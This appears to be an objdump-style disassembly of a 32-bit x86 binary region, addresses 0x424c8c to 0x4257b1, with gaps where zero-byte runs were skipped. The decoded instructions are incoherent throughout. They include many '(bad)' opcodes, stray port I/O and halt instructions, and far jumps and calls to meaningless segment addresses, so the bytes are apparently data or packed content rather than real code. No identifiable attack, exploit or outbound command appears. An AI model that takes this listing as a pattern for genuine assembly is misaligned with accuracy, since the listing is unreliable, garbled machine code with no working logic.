  424c8c:	xchg   ecx,eax
  424c8d:	loopne 0x424ca7
  424c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c90:	sti    
  424c91:	fsubr  st,st(2)
  424c93:	sbb    al,0xa2
  424c95:	mov    ebx,0xa7026a5b
  424c9a:	push   ecx
  424c9b:	push   0x57730296
  424ca0:	sub    BYTE PTR [ebx+ecx*2-0x4d],bh
  424ca4:	call   0xd6b7a357
  424ca9:	je     0x424c6a
  424cab:	xlat   BYTE PTR ds:[ebx]
  424cac:	rcr    BYTE PTR [ebp-0x26],1
  424caf:	adc    eax,0xa871f0c0
  424cb4:	bound  eax,QWORD PTR [edx-0x50685441]
  424cba:	aaa    
  424cbb:	sub    al,0x1f
  424cbd:	cmp    bl,BYTE PTR [ebx+eax*8]
  424cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  424d31:	add    BYTE PTR [eax],al
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4+0x66ab94d7]
  424d42:	push   edi
  424d43:	mov    eax,0x1883e
  424d48:	cmc    
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [ebp+0x1efb4481],ah
  424d51:	mov    DWORD PTR [edi+ecx*8],ecx
  424d54:	mov    eax,0xbd4cf919
  424d59:	lods   al,BYTE PTR ds:[esi]
  424d5a:	mov    eax,0xeac48907
  424d5f:	stos   BYTE PTR es:[edi],al
  424d60:	jge    0x424d24
  424d62:	pop    eax
  424d63:	jmp    0x73d6fbae
  424d68:	inc    BYTE PTR [edx+ecx*1]
  424d6b:	and    esi,DWORD PTR [edi]
  424d6d:	daa    
  424d6e:	cwde   
  424d6f:	test   al,0x1b
  424d71:	fiadd  DWORD PTR [ebx]
  424d73:	jns    0x424d53
  424d75:	fisubr DWORD PTR [eax]
  424d77:	ja     0x424d57
  424d79:	mov    ch,0x24
  424d7b:	push   0x27dbe5fa
  424d80:	(bad)
  424d83:	pop    esi
  424d84:	aad    0x55
  424d86:	mov    dl,0x1a
  424d88:	push   esp
  424d89:	lds    esi,FWORD PTR [edx]
  424d8b:	pusha  
  424d8c:	cmp    ah,BYTE PTR [ebx]
  424d8e:	mov    ch,0xd0
  424d90:	mov    ch,0xbb
  424d92:	into   
  424d93:	push   edi
  424d94:	sbb    ebx,DWORD PTR [ebx+0x64]
  424d97:	stc    
  424d98:	fs into 
  424d9a:	jl     0x424d81
  424d9c:	xchg   ebp,eax
  424d9d:	fmul   QWORD PTR [esi-0x67]
  424da0:	mov    ecx,0x9a784bd9
  424da5:	push   ecx
  424da6:	fld    DWORD PTR [ecx+ebp*1-0x16]
  424daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dab:	les    edx,FWORD PTR [ebx+0x50]
  424dae:	add    al,BYTE PTR [ecx-0x16555ae0]
  424db4:	inc    ebx
  424db5:	adc    DWORD PTR [edi+0x4a5a4e0a],esp
  424dbb:	out    0x6d,eax
  424dbd:	div    DWORD PTR [ebx+0x558fc6d1]
  424dc3:	inc    edi
  424dc4:	mov    ah,0x29
  424dc6:	cmp    ecx,0x49
  424dc9:	pop    ss
  424dca:	cld    
  424dcb:	rol    dh,0x90
  424dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dcf:	ss xchg ecx,eax
  424dd1:	retf   0x991f
  424dd4:	mov    al,0x32
  424dd6:	jecxz  0x424e3b
  424dd8:	inc    eax
  424dd9:	jge    0x424db3
  424ddb:	cs push ss
  424ddd:	lea    edi,[edi+edi*8+0x65]
  424de1:	aam    0x18
  424de3:	jne    0x424db1
  424de5:	push   ecx
  424de6:	jmp    0x6b7:0x3681477
  424ded:	push   edi
  424dee:	and    BYTE PTR [esi],dl
  424df0:	jne    0x424e2c
  424df2:	(bad)  [edx+edi*8]
  424df5:	cmp    esi,edx
  424df7:	adc    eax,0xef232690
  424dfc:	cmp    eax,0x19710e32
  424e01:	jae    0x424e4d
  424e03:	sub    BYTE PTR [ebp-0x7c],al
  424e06:	cmp    esp,DWORD PTR [ecx+ebp*4]
  424e09:	xchg   ebx,eax
  424e0a:	cld    
  424e0b:	clc    
  424e0c:	scas   al,BYTE PTR es:[edi]
  424e0d:	bound  edx,QWORD PTR [edx+0x4f]
  424e10:	jb     0x424e5d
  424e12:	pushf  
  424e13:	mov    DWORD PTR [esi+ebp*1-0x79],eax
  424e17:	mov    ebx,0x76d27369
  424e1c:	dec    eax
  424e1d:	mov    al,ds:0x70a6cc99
  424e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e23:	pop    edi
  424e24:	cwde   
  424e25:	push   esi
  424e26:	sbb    BYTE PTR [edx+0x4d],ah
  424e29:	sub    al,0xe7
  424e2b:	add    BYTE PTR [ebp-0x3a],0xc5
  424e2f:	jmp    0xbf03:0xb503f6df
  424e36:	pop    eax
  424e37:	or     DWORD PTR [esi+eax*1],edi
  424e3a:	rol    DWORD PTR ds:0x9ed1ae29,cl
  424e40:	sbb    al,0x0
	...
  424eb2:	add    BYTE PTR [eax],al
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	call   0x9fff:0xff74b964
  424ebc:	xchg   edx,eax
  424ebd:	dec    ebp
  424ebe:	lea    edx,[edx+0x3a982720]
  424ec4:	xor    ecx,DWORD PTR [ecx+0xf50001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	cdq    
  424ecd:	loopne 0x424eb5
  424ecf:	adc    al,0x8f
  424ed1:	mov    eax,0x6d1f00de
  424ed6:	inc    ebx
  424ed7:	or     DWORD PTR [ebp-0xafc1dbf],esp
  424edd:	jl     0x424e86
  424edf:	int3   
  424ee0:	test   eax,eax
  424ee2:	mov    edi,edx
  424ee4:	fbstp  TBYTE PTR [esi]
  424ee6:	aad    0x61
  424ee8:	shl    BYTE PTR [ecx+0x5924adcc],0xd9
  424eef:	jle    0x424efd
  424ef1:	jge    0x424f22
  424ef3:	sub    al,0x38
  424ef5:	cmp    DWORD PTR [eax],0xffffffdf
  424ef8:	test   al,0xc1
  424efa:	dec    edx
  424efb:	sub    al,cl
  424efd:	jne    0x424f4b
  424eff:	jns    0x424f6e
  424f01:	pop    ss
  424f02:	adc    DWORD PTR [ebp-0x6326e2f9],esp
  424f08:	sub    BYTE PTR [edx+0x16],bh
  424f0b:	(bad)  
  424f0c:	cmp    al,0xaa
  424f0e:	stos   BYTE PTR es:[edi],al
  424f0f:	xlat   BYTE PTR fs:[ebx]
  424f11:	xchg   esp,eax
  424f12:	jae    0x424e98
  424f14:	rcl    BYTE PTR [esi],cl
  424f16:	jmp    0x424ece
  424f18:	(bad)  
  424f19:	jecxz  0x424ea3
  424f1b:	int3   
  424f1c:	cld    
  424f1d:	repnz adc al,0xc1
  424f20:	in     al,0x73
  424f22:	(bad)  
  424f23:	gs pop edi
  424f25:	jnp    0x424eb0
  424f27:	jp     0x424f22
  424f29:	and    BYTE PTR [edi+0x2f],bh
  424f2c:	cmp    eax,0x43392332
  424f31:	sbb    DWORD PTR [eax-0x10],esp
  424f34:	cli    
  424f35:	scas   al,BYTE PTR es:[edi]
  424f36:	jecxz  0x424f5d
  424f38:	xlat   BYTE PTR ds:[ebx]
  424f39:	push   esi
  424f3a:	mov    ch,0xe3
  424f3c:	bound  ecx,QWORD PTR [ebp-0x29696527]
  424f42:	pop    eax
  424f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f44:	push   ss
  424f45:	rcl    cl,0x75
  424f48:	sub    BYTE PTR [edx],bh
  424f4a:	push   es
  424f4b:	sbb    esi,ecx
  424f4d:	jmp    0x424f60
  424f4f:	mov    dh,0x5b
  424f51:	mov    bh,0x85
  424f53:	jne    0x424f24
  424f55:	dec    esi
  424f56:	dec    edx
  424f57:	pop    ebx
  424f58:	js     0x424fab
  424f5a:	pop    eax
  424f5c:	inc    edx
  424f5d:	pop    ss
  424f5e:	push   es
  424f5f:	test   eax,ebx
  424f61:	push   esp
  424f62:	fsub   QWORD PTR [eax]
  424f64:	popa   
  424f65:	or     ah,bl
  424f67:	sbb    al,0xe9
  424f69:	pop    es
  424f6a:	test   BYTE PTR [ecx],ah
  424f6c:	(bad)  
  424f6d:	jl     0x424f3b
  424f6f:	mov    dl,0x4b
  424f71:	lock or eax,0x8ede5765
  424f77:	pop    ss
  424f78:	push   es
  424f79:	jns    0x424fe6
  424f7b:	test   al,0xe8
  424f7d:	mov    ds:0x478b1fd1,al
  424f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f83:	int    0xf3
  424f85:	shr    DWORD PTR [ecx+0x2a],0x88
  424f89:	cdq    
  424f8a:	push   edx
  424f8b:	lods   al,BYTE PTR ds:[esi]
  424f8c:	sti    
  424f8d:	xor    dh,al
  424f8f:	inc    esp
  424f90:	xchg   ecx,eax
  424f91:	sub    esp,DWORD PTR [ebp-0x7]
  424f94:	ins    BYTE PTR es:[edi],dx
  424f95:	xchg   ecx,eax
  424f96:	(bad)  
  424f98:	jge    0x424f79
  424f9a:	or     BYTE PTR es:[edx],cl
  424f9d:	jns    0x424f52
  424f9f:	adc    ebx,DWORD PTR [ebx+0x35]
  424fa2:	or     DWORD PTR [eax],eax
  424fa4:	jge    0x424fc0
  424fa6:	enter  0x31ee,0x99
  424faa:	out    0x65,al
  424fac:	adc    dh,BYTE PTR [esi+edx*1+0x5a]
  424fb0:	inc    edx
  424fb1:	les    eax,FWORD PTR [eax-0x66]
  424fb4:	jnp    0x424f7b
  424fb6:	xchg   edi,eax
  424fb7:	fwait
  424fb8:	sbb    eax,ebx
  424fba:	jp     0x425000
  424fbc:	sbb    eax,0xb226c96f
	...
  425031:	add    BYTE PTR [eax],al
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	mov    bh,0xf1
  425042:	loopne 0x424fe9
  425044:	sub    BYTE PTR [edx+0xf50001],cl
  42504a:	add    BYTE PTR [eax],al
  42504c:	gs cs (bad) 
  42504f:	fs xchg ebp,eax
  425051:	sahf   
  425052:	cmp    al,0x4c
  425054:	mov    ch,0x1f
  425056:	jno    0x42505e
  425058:	retf   
  425059:	inc    eax
  42505a:	addr16 push edi
  42505c:	addr16 stc 
  42505e:	pop    es
  42505f:	mov    bh,BYTE PTR [eax+ecx*4-0x3ab4c952]
  425066:	cmp    esp,ecx
  425068:	popa   
  425069:	leave  
  42506a:	in     eax,dx
  42506b:	imul   DWORD PTR [esi-0x9caa2aa]
  425071:	xor    al,BYTE PTR [ebx-0x60]
  425074:	loope  0x42508b
  425076:	push   eax
  425077:	mov    fs,WORD PTR [edx+0x4cb1f615]
  42507d:	mov    al,0xf1
  42507f:	test   al,0xde
  425081:	hlt    
  425082:	pop    es
  425083:	cmp    DWORD PTR [esi],0xffffff8d
  425086:	mov    dl,0x62
  425088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425089:	frstor [ebx+0x574bd8af]
  42508f:	push   ds
  425090:	xor    DWORD PTR [ebx+0x6f],esp
  425093:	pop    ebp
  425094:	cs push eax
  425096:	call   0x29008f8a
  42509b:	xor    esi,DWORD PTR [ecx+0x58]
  42509e:	retf   
  42509f:	dec    esi
  4250a0:	and    ch,BYTE PTR [edi-0x5101ed67]
  4250a6:	mov    ch,BYTE PTR [eax-0x4d]
  4250a9:	loope  0x4250dd
  4250ab:	test   ebx,ecx
  4250ad:	and    ebp,DWORD PTR [edx]
  4250af:	pop    es
  4250b0:	mov    ecx,0x1e3235b9
  4250b5:	mov    ah,0xdd
  4250b7:	jmp    0xb325994d
  4250bc:	cld    
  4250bd:	or     esi,ebx
  4250bf:	popa   
  4250c0:	sub    DWORD PTR [ebp-0x7671718e],edx
  4250c6:	enter  0x8db6,0x89
  4250ca:	out    0xdd,eax
  4250cc:	jmp    0x425077
  4250ce:	push   edi
  4250cf:	fwait
  4250d0:	cmp    al,cl
  4250d2:	dec    eax
  4250d3:	sub    dh,BYTE PTR [eax+0x4ef8326f]
  4250d9:	xchg   ebx,eax
  4250da:	hlt    
  4250db:	pop    ecx
  4250dc:	jne    0x425109
  4250de:	jl     0x4250b1
  4250e0:	mov    eax,ds:0x6d071b1b
  4250e5:	sbb    dl,cl
  4250e7:	fmul   st,st(5)
  4250e9:	cwde   
  4250ea:	je     0x42512c
  4250ec:	fdivr  DWORD PTR ds:0xe84c468b
  4250f2:	(bad)  
  4250f3:	jnp    0x425103
  4250f5:	(bad)  
  4250f6:	aad    0x3a
  4250f8:	repz (bad) [eiz*2+0x42838717]
  425100:	adc    al,0xd2
  425102:	sbb    al,ch
  425104:	in     eax,0x65
  425106:	mov    edx,0x297cbba1
  42510b:	and    BYTE PTR [esi],ah
  42510d:	jns    0x42518a
  42510f:	rcr    BYTE PTR [edx-0x47],cl
  425112:	or     DWORD PTR [eax],esp
  425114:	inc    ebp
  425115:	das    
  425116:	mov    WORD PTR [edx+0x52],gs
  425119:	and    ebx,DWORD PTR [edx+0x12460f57]
  42511f:	mov    ah,BYTE PTR [esi+eax*4+0x64]
  425123:	add    BYTE PTR [esi+0x2b],bh
  425126:	xchg   edi,eax
  425127:	rcl    DWORD PTR [ebx],1
  425129:	mov    esp,DWORD PTR [ecx]
  42512b:	aaa    
  42512c:	jb     0x425158
  42512e:	push   ss
  42512f:	mov    al,BYTE PTR [ecx]
  425131:	push   ds
  425132:	sti    
  425133:	lods   al,BYTE PTR ds:[esi]
  425134:	dec    ebx
  425135:	cmp    al,0x36
  425137:	mov    ebx,0x977d7def
  42513c:	jae    0x42511e
  42513e:	mov    esi,0xc156
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	mov    ah,0x26
  4251c2:	push   edx
  4251c3:	in     eax,0x1d
  4251c5:	mov    eax,DWORD PTR [ecx]
  4251c7:	add    ch,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [esi+eiz*1-0x5b08b085],dl
  4251d2:	adc    BYTE PTR [edi+0x23],bl
  4251d5:	pop    ebx
  4251d6:	scas   eax,DWORD PTR es:[edi]
  4251d7:	add    ebp,DWORD PTR [esi]
  4251d9:	adc    eax,0xb2480a29
  4251de:	call   0xa583:0x7a1ddb10
  4251e5:	fild   WORD PTR [ebx+0x22]
  4251e8:	pop    eax
  4251e9:	gs scas eax,DWORD PTR es:[edi]
  4251eb:	fbstp  TBYTE PTR [edx-0xc]
  4251ee:	push   ecx
  4251ef:	sbb    ebp,DWORD PTR [ecx-0x172fc973]
  4251f5:	xor    ah,BYTE PTR [edi+ebx*2+0x60cb2267]
  4251fc:	mov    eax,ds:0xe121f3fd
  425201:	sub    al,0xb0
  425203:	fwait
  425204:	(bad)  
  425205:	pop    esp
  425206:	daa    
  425207:	add    eax,0x3578c57f
  42520c:	std    
  42520d:	dec    edi
  42520e:	dec    ebx
  42520f:	jo     0x42522c
  425211:	popf   
  425212:	mov    ds:0xac31d660,eax
  425217:	test   BYTE PTR [eax+0x5c],al
  42521a:	cmp    al,0x4
  42521c:	mov    al,ds:0x9841d42a
  425221:	and    DWORD PTR [ebp+0x39e8b661],esp
  425227:	fimul  DWORD PTR [ebp-0x2a7bbba5]
  42522d:	adc    eax,0xcfe305f2
  425232:	retf   
  425233:	loopne 0x4251c7
  425235:	or     ah,dh
  425237:	lods   eax,DWORD PTR ds:[esi]
  425238:	mov    ds,WORD PTR [ebp-0x40]
  42523b:	aaa    
  42523c:	mov    ebp,0xc09a101f
  425241:	jge    0x4252b3
  425243:	jae    0x425229
  425245:	div    DWORD PTR [ebp+0x3846f062]
  42524b:	repz fimul WORD PTR [ecx+0x4a0c7321]
  425252:	mov    dl,0xfe
  425254:	lods   al,BYTE PTR ds:[esi]
  425255:	sbb    al,0x42
  425257:	mov    al,ds:0xa82ee412
  42525c:	mov    eax,ds:0x783769ac
  425261:	stc    
  425262:	ins    BYTE PTR es:[edi],dx
  425263:	nop
  425264:	push   ss
  425265:	in     al,0x8d
  425267:	test   eax,ecx
  425269:	adc    bl,BYTE PTR [edx+0x45ef19bd]
  42526f:	mov    ebp,0xc520a556
  425274:	xor    al,0xc6
  425276:	xchg   esi,eax
  425277:	daa    
  425278:	shl    dh,0xef
  42527b:	pusha  
  42527c:	or     BYTE PTR [esi+ebp*8],ah
  42527f:	mov    eax,0x3b779278
  425284:	aaa    
  425285:	hlt    
  425286:	xchg   dl,ch
  425288:	call   FWORD PTR [ebx-0x7b11e2df]
  42528e:	push   ebx
  42528f:	jecxz  0x4252e2
  425291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425292:	xor    eax,DWORD PTR [ecx+0x23]
  425295:	xchg   ebp,eax
  425296:	fild   WORD PTR [eax]
  425298:	mov    cl,0x78
  42529a:	(bad)  
  42529b:	icebp  
  42529c:	jle    0x425286
  42529e:	adc    ebp,esp
  4252a0:	pop    ebp
  4252a1:	dec    ebx
  4252a2:	fldenv [ebx+0x7b]
  4252a5:	mov    esp,0x83626a66
  4252aa:	adc    DWORD PTR [ecx+0x28],0x27d282a6
  4252b1:	mov    ebp,0x31f4fa78
  4252b6:	mov    al,ds:0x4e2fb4dc
  4252bb:	sar    BYTE PTR [eax+0x5],cl
  4252be:	and    bl,BYTE PTR [eax-0x7f]
	...
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz jmp 0x18c:0x121ee98a
  425347:	add    ch,dh
  425349:	add    BYTE PTR [eax],al
  42534b:	add    BYTE PTR [edx-0x38],ch
  42534e:	ficomp WORD PTR ds:0x24cfd28f
  425354:	mov    bh,0xa8
  425356:	jo     0x42532d
  425358:	cmp    DWORD PTR [ecx-0x10],edi
  42535b:	inc    eax
  42535c:	push   ebp
  42535d:	jbe    0x42534e
  42535f:	jmp    0xfaf6dfe3
  425364:	inc    eax
  425365:	or     eax,0x8a76dc5e
  42536a:	int3   
  42536b:	mov    edx,DWORD PTR [ebp+0x66]
  42536e:	jnp    0x4253cd
  425370:	sti    
  425371:	aaa    
  425372:	pop    esi
  425373:	inc    esp
  425374:	jmp    0xc83d:0x5475e497
  42537b:	cs (bad) 
  42537d:	xchg   ebp,eax
  42537e:	xchg   esi,edx
  425380:	add    cl,dh
  425382:	ds ss sub edi,eax
  425386:	jb     0x4253bc
  425388:	outs   dx,DWORD PTR ds:[esi]
  425389:	inc    edx
  42538a:	daa    
  42538b:	inc    eax
  42538c:	ret    0x13fe
  42538f:	mov    bh,0xd7
  425392:	enter  0xf0e3,0x23
  425396:	ret    
  425397:	mov    edx,db3
  42539a:	pushf  
  42539b:	lea    edx,[esi-0x6a27428c]
  4253a1:	rol    DWORD PTR [ebx+0x1cbfaa3f],1
  4253a7:	mov    eax,0xb4f1ac0f
  4253ac:	int    0x56
  4253ae:	mov    esi,0xae8c5aff
  4253b3:	cmp    DWORD PTR [ecx],edi
  4253b5:	and    al,0xa5
  4253b7:	call   0x7eba:0xdb3f7f5c
  4253be:	mov    esi,0x72da5ec8
  4253c3:	dec    ecx
  4253c4:	call   0xfb37:0x8b5e08ae
  4253cb:	mov    eax,ds:0x7b00fe2d
  4253d0:	dec    eax
  4253d1:	sub    bl,cl
  4253d3:	and    al,0xec
  4253d5:	lods   eax,DWORD PTR ds:[esi]
  4253d6:	shl    ebp,0x2d
  4253d9:	mov    esp,0xdecced92
  4253de:	imul   esi,DWORD PTR [esi+0x15],0x43212a4c
  4253e5:	pop    ecx
  4253e6:	pop    ecx
  4253e7:	dec    ecx
  4253e8:	cmp    eax,0x82078605
  4253ed:	ret    
  4253ee:	dec    ebx
  4253ef:	dec    edx
  4253f0:	sub    eax,0xb37a1bbe
  4253f5:	adc    DWORD PTR [eax],eax
  4253f7:	rcr    eax,1
  4253f9:	adc    ch,0xc
  4253fc:	or     al,0x3
  4253fe:	push   ecx
  4253ff:	pop    ecx
  425400:	jl     0x425474
  425402:	mov    ds:0xde24e851,al
  425407:	sbb    eax,0x2c379322
  42540c:	mov    ch,0x3a
  42540e:	loop   0x42541f
  425410:	dec    edx
  425411:	outs   dx,BYTE PTR fs:[esi]
  425413:	aad    0xb2
  425415:	lock sbb DWORD PTR [esi-0x1a],ebx
  425419:	jl     0x4253a4
  42541b:	push   ecx
  42541c:	call   0xdca:0xeb1ca80c
  425423:	inc    ebp
  425424:	loopne 0x425401
  425426:	pop    eax
  425427:	xchg   ebp,eax
  425428:	sub    BYTE PTR [ecx+ebp*8+0x502d3863],ch
  42542f:	fs jno 0x425445
  425432:	jo     0x425415
  425434:	xor    cl,dl
  425436:	push   ds
  425437:	ret    0x3b40
  42543a:	mov    ecx,0xe6df896f
  42543f:	dec    ebx
  425440:	lods   eax,DWORD PTR ds:[esi]
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	arpl   sp,bp
  4254c2:	pop    ds
  4254c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254c4:	pop    es
  4254c5:	lea    eax,[ecx]
  4254c7:	add    ch,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [ecx-0x39],bl
  4254ce:	lea    ebp,[edi+0x25]
  4254d1:	or     DWORD PTR [eax+0x430189ac],ebp
  4254d7:	cmp    al,BYTE PTR [esi+0x26d3bb7b]
  4254dd:	mov    ds:0xd5868d6d,al
  4254e2:	rep outs dx,BYTE PTR ds:[esi]
  4254e4:	pop    ebx
  4254e5:	and    al,BYTE PTR [edx-0x1c]
  4254e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254e9:	inc    ebp
  4254ea:	pop    ds
  4254eb:	ss pop ecx
  4254ed:	or     ebx,DWORD PTR [edi-0x48]
  4254f0:	idiv   DWORD PTR [esi+ebx*1-0xc6ab492]
  4254f7:	fwait
  4254f8:	mov    bl,0x8d
  4254fa:	(bad)  
  4254fb:	dec    esi
  4254fc:	xlat   BYTE PTR ds:[ebx]
  4254fd:	push   esi
  4254fe:	adc    eax,0x62d6c0aa
  425503:	cwde   
  425504:	lods   al,BYTE PTR ds:[esi]
  425505:	dec    ebx
  425506:	imul   esi,DWORD PTR [ecx-0x19165cc6],0xffffffdc
  42550d:	leave  
  42550e:	aad    0x60
  425510:	cmp    BYTE PTR [ebx+edi*1-0x33],dh
  425514:	xor    eax,0xe5a47cf7
  425519:	mov    esp,0x17c1ba45
  42551e:	test   BYTE PTR [edx+0x64],ch
  425521:	push   ebx
  425522:	cmp    al,0x70
  425524:	and    esp,ecx
  425526:	hlt    
  425527:	dec    edx
  425528:	mov    edi,0xceacbaf4
  42552d:	jbe    0x4254e7
  42552f:	call   0xc796fe35
  425534:	push   es
  425535:	and    al,cl
  425537:	adc    eax,0x44a7fca3
  42553c:	(bad)  
  42553d:	out    dx,al
  42553e:	fld    QWORD PTR [esp+ebx*4]
  425541:	ror    DWORD PTR [edx],0xf
  425544:	std    
  425545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425546:	in     eax,dx
  425547:	jb     0x425544
  425549:	in     al,dx
  42554a:	or     DWORD PTR [ebp+edi*8+0x4122f5e8],esi
  425551:	push   ebx
  425552:	or     ch,BYTE PTR [edi+ecx*2-0x44185e7a]
  425559:	(bad)  
  42555a:	scas   al,BYTE PTR es:[edi]
  42555b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42555c:	jl     0x42559c
  42555e:	out    dx,eax
  42555f:	out    0xf5,eax
  425561:	clc    
  425562:	or     ebx,DWORD PTR [ecx]
  425564:	xchg   ecx,eax
  425565:	mov    dh,0x7d
  425567:	sbb    BYTE PTR [edi+esi*4+0x7c],al
  42556b:	pop    ecx
  42556c:	inc    ebp
  42556d:	aam    0xe4
  42556f:	js     0x4255bd
  425571:	pop    ebp
  425572:	or     eax,0x52788a05
  425577:	add    al,0x84
  425579:	sbb    DWORD PTR [edx+0x55],edi
  42557c:	ror    BYTE PTR [edx],1
  42557e:	lock lods al,BYTE PTR ds:[esi]
  425580:	aas    
  425581:	cs aad 0xce
  425584:	pop    esp
  425585:	pusha  
  425586:	mov    al,0x7f
  425588:	and    BYTE PTR ds:0xed60e6e9,dl
  42558e:	repnz sar DWORD PTR gs:0xb6f059a7,1
  425596:	jnp    0x42554a
  425598:	fwait
  425599:	rol    DWORD PTR [ebp-0x23765370],cl
  42559f:	bound  ebx,QWORD PTR [esi+ebx*8-0x65]
  4255a3:	sub    al,0xcf
  4255a5:	push   0xfcf0e0bf
  4255aa:	fadd   QWORD PTR [edx-0x2c3c3ef5]
  4255b0:	ret    
  4255b1:	js     0x4255bb
  4255b3:	or     al,bh
  4255b5:	lods   eax,DWORD PTR ds:[esi]
  4255b6:	ins    DWORD PTR es:[edi],dx
  4255b7:	sub    al,0x81
  4255b9:	xchg   edx,eax
  4255ba:	inc    ebp
  4255bb:	or     BYTE PTR [ebp+0x13],0xd5
  4255bf:	mov    WORD PTR [ebx],?
	...
  425631:	add    BYTE PTR [eax],al
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	int    0x16
  425642:	xchg   ecx,eax
  425643:	idiv   ah
  425645:	lea    eax,[ecx]
  425647:	add    ch,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    dh,al
  42564d:	out    dx,al
  42564e:	push   0x6626e8ac
  425653:	push   0xffffff83
  425655:	sub    BYTE PTR [ecx-0x1f26f7cd],0x8f
  42565c:	ss out 0x92,al
  42565f:	lods   eax,DWORD PTR ds:[esi]
  425660:	mov    edi,0x2bed3a35
  425665:	inc    esp
  425666:	sub    ecx,edi
  425668:	mov    eax,ds:0x616fcb89
  42566d:	aad    0x8d
  42566f:	jg     0x4256cb
  425671:	popa   
  425672:	imul   ebx,DWORD PTR [esi-0x4e],0xa
  425676:	(bad)  
  425677:	push   ecx
  425678:	pop    eax
  425679:	outs   dx,BYTE PTR ds:[esi]
  42567a:	fbld   TBYTE PTR [edi+0x58]
  42567d:	push   ecx
  42567e:	imul   edx,DWORD PTR [ebx],0xf80408df
  425684:	and    eax,0xf9fe7510
  425689:	inc    esi
  42568a:	adc    edx,esp
  42568c:	mov    ah,0x1f
  42568e:	popf   
  42568f:	jne    0x425671
  425691:	push   ss
  425692:	std    
  425693:	push   eax
  425694:	jecxz  0x4256df
  425696:	cdq    
  425697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425698:	iret   
  425699:	fcmovnu st,st(4)
  42569b:	in     al,dx
  42569c:	rol    ah,1
  42569e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256a0:	retf   
  4256a1:	mov    cl,0xf7
  4256a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256a4:	je     0x42570f
  4256a6:	mov    edi,0x5ae60021
  4256ab:	inc    ecx
  4256ac:	(bad)  
  4256ad:	daa    
  4256ae:	mov    WORD PTR [esi],?
  4256b0:	adc    DWORD PTR [esi],ebx
  4256b2:	adc    BYTE PTR [esi-0x9a2b9c4],0x9b
  4256b9:	cld    
  4256ba:	ins    BYTE PTR es:[edi],dx
  4256bb:	push   0x4e4e4539
  4256c0:	out    0xfe,al
  4256c2:	mov    eax,0xfd024bfe
  4256c7:	iret   
  4256c8:	mov    WORD PTR [eax],ss
  4256ca:	hlt    
  4256cb:	mov    DWORD PTR [esi+0xa],edi
  4256ce:	or     esi,DWORD PTR [edi]
  4256d0:	xor    BYTE PTR cs:[ecx-0x66],0x58
  4256d5:	loope  0x4256eb
  4256d7:	test   al,0x8c
  4256d9:	mov    bh,0x95
  4256db:	ret    0xf89e
  4256de:	xor    bl,bh
  4256e0:	(bad)  
  4256e1:	lods   eax,DWORD PTR ds:[esi]
  4256e2:	popa   
  4256e3:	push   edx
  4256e4:	out    0x1f,al
  4256e6:	adc    DWORD PTR [ebp-0xa304de3],ebx
  4256ec:	mov    esi,0x7fe1ff3f
  4256f1:	xor    DWORD PTR [eax+0x5],esp
  4256f4:	jle    0x42567d
  4256f6:	xor    DWORD PTR [eax-0x19ffa5a],0x143817e9
  425700:	loopne 0x42573e
  425702:	jg     0x425693
  425704:	lods   al,BYTE PTR ds:[esi]
  425705:	or     DWORD PTR [eax+0x76],ebp
  425708:	lea    edi,[esi]
  42570a:	sar    ebx,1
  42570c:	adc    BYTE PTR [ebx],0x2
  42570f:	repnz cmp ecx,DWORD PTR [ebx+edx*2-0x16f72dab]
  425717:	xchg   edi,eax
  425718:	inc    ecx
  425719:	iret   
  42571a:	cwde   
  42571b:	fwait
  42571c:	ds (bad) 
  42571e:	jns    0x4256f1
  425720:	inc    ecx
  425721:	mov    edx,0x10d558b9
  425726:	or     eax,0x9bf570b6
  42572b:	adc    DWORD PTR [ebp+0x5cb23d67],esp
  425731:	jmp    0xcb51eb65
  425736:	pop    eax
  425737:	lock or al,0xaf
  42573a:	mov    eax,0x15c9dc6
  42573f:	fdiv   st,st(7)
	...
  4257b1:	add    BYTE PTR [eax],al
